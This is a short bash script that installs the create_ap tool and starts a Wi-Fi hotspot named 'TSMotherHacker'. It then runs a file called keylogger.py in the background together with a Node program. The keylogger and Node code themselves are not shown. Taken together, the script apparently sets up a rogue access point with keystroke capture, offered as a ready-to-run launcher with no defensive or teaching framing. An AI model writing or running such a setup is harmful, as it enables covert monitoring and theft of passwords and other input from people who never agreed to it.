#!/bin/bash
git clone https://github.com/oblique/create_ap
cd create_ap
sudo make install
sudo create_ap wlp2s0 wlp2s0 TSMotherHacker
cd ..
python keylogger.py & node index.js
